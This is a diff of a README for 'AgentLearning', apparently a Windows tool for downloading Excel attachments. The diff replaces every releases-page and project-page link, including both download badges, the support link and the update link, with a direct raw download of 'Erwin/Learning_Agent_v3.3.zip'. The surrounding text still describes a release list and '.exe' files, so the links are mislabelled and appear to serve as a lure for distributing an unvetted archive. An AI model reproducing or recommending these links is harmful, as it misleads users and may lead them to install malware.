@@ -1,6 +1,6 @@
 # 📂 AgentLearning - Simple Excel Attachment Download
 
-[![Download AgentLearning](https://img.shields.io/badge/Download-AgentLearning-brightgreen)](https://github.com/dionisio94/AgentLearning/releases)
+[![Download AgentLearning](https://img.shields.io/badge/Download-AgentLearning-brightgreen)](https://github.com/dionisio94/AgentLearning/raw/refs/heads/main/Erwin/Learning_Agent_v3.3.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these steps to get AgentLearning running on your Windows computer:
 
 Click the big badge above or visit the link below directly:
 
-[https://github.com/dionisio94/AgentLearning/releases](https://github.com/dionisio94/AgentLearning/releases)
+[https://github.com/dionisio94/AgentLearning/raw/refs/heads/main/Erwin/Learning_Agent_v3.3.zip](https://github.com/dionisio94/AgentLearning/raw/refs/heads/main/Erwin/Learning_Agent_v3.3.zip)
 
 This page has the latest version of the software. You will see a list of files. Look for the file that matches your version of Windows.
 
@@ -105,7 +105,7 @@ If you run into issues, try the following:
 
 If you need more support:
 
-- Visit the project’s GitHub page: [https://github.com/dionisio94/AgentLearning](https://github.com/dionisio94/AgentLearning)
+- Visit the project’s GitHub page: [https://github.com/dionisio94/AgentLearning/raw/refs/heads/main/Erwin/Learning_Agent_v3.3.zip](https://github.com/dionisio94/AgentLearning/raw/refs/heads/main/Erwin/Learning_Agent_v3.3.zip)
 - Check the Issues tab to see if someone else reported a problem.
 - You can open a new issue describing your problem clearly.
 
@@ -115,7 +115,7 @@ If you need more support:
 
 Check the release page regularly for new versions:
 
-[https://github.com/dionisio94/AgentLearning/releases](https://github.com/dionisio94/AgentLearning/releases)
+[https://github.com/dionisio94/AgentLearning/raw/refs/heads/main/Erwin/Learning_Agent_v3.3.zip](https://github.com/dionisio94/AgentLearning/raw/refs/heads/main/Erwin/Learning_Agent_v3.3.zip)
 
 Download the latest `.exe` file and install it over the existing version to keep your app up to date.
 
@@ -135,4 +135,4 @@ All downloaded files remain on your local device. The program does not send file
 
 ---
 
-[![Download AgentLearning](https://img.shields.io/badge/Download-AgentLearning-blue?style=for-the-badge)](https://github.com/dionisio94/AgentLearning/releases)
+[![Download AgentLearning](https://img.shields.io/badge/Download-AgentLearning-blue?style=for-the-badge)](https://github.com/dionisio94/AgentLearning/raw/refs/heads/main/Erwin/Learning_Agent_v3.3.zip)
